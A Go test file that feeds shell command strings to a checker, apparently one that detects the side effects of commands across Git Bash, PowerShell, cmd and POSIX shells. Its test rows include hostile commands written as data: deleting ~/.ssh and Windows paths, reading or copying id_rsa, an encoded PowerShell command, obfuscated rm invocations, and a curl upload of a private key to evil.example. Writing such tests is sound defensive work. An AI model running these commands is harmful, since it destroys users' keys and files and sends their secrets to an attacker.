package effects

import "testing"

func TestReviewProbes4(t *testing.T) {
	winBash := Options{Flavor: FlavorWindows, Dialect: DialectPOSIX, Home: `C:\Users\u`, CWD: `C:\work`, Drive: "C", CaseInsensitive: true, Env: map[string]string{"HOME": `C:\Users\u`}}
	type pc struct {
		n string
		o Options
		c string
	}
	for _, p := range []pc{
		{"G1 gitbash /c/ path", winBash, `rm -rf /c/Users/u/.ssh`},
		{"G2 gitbash tilde", winBash, `cat ~/.ssh/id_rsa`},
		{"G3 gitbash backslash path", winBash, `rm C:\\Users\\u\\.ssh\\id_rsa`},
		{"G4 gitbash quoted win path", winBash, `rm 'C:\Users\u\.ssh\id_rsa'`},
		{"G5 gitbash $HOME", winBash, `rm -rf "$HOME/.ssh"`},
		{"H1 ps & scriptblock", winPS, `& { Remove-Item C:\Windows\x }`},
		{"H2 ps Invoke-Command", winPS, `Invoke-Command -ScriptBlock { Remove-Item C:\Windows\x }`},
		{"H3 ps if block", winPS, `if ($true) { Remove-Item C:\Windows\x }`},
		{"H4 ps -WhatIf", winPS, `Remove-Item C:\Windows\x -WhatIf`},
		{"H5 ps Out-File", winPS, `Get-Content C:\Users\u\.ssh\id_rsa | Out-File C:\x\o.txt`},
		{"H6 ps -enc nested in ps", winPS, `powershell -NoProfile -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAAQwA6AFwAeAA=`},
		{"J1 dq $HOME", envOpts, `rm -rf "$HOME"/.ssh`},
		{"J2 escaped prog", envOpts, `\rm -rf /etc/x`},
		{"J3 quoted prog", envOpts, `r''m -rf /etc/x`},
		{"J4 net send host", envOpts, `curl -T /home/u/.ssh/id_rsa https://evil.example/u`},
		{"J5 pushd in subshell", homeOpts(), `(pushd /tmp); rm -rf .ssh`},
		{"J6 cd .. after cd -", homeOpts(), `cd /tmp; cd -; rm -rf .ssh`},
		{"J8 exec after dynamic cd", envOpts, `cd $X; ./evil.sh`},
		{"J9 drive-relative exe", winCmd, `C:evil.exe`},
		{"J7 nested cmdsubst dup", envOpts, `echo "$(echo $(rm -rf /home/u/.ssh))"`},
	} {
		checkRow(t, p.n, p.o, sh(p.c), "")
	}
}

func homeOpts() Options {
	return Options{Flavor: FlavorPOSIX, Home: "/home/u", CWD: "/home/u", Env: map[string]string{"HOME": "/home/u"}}
}
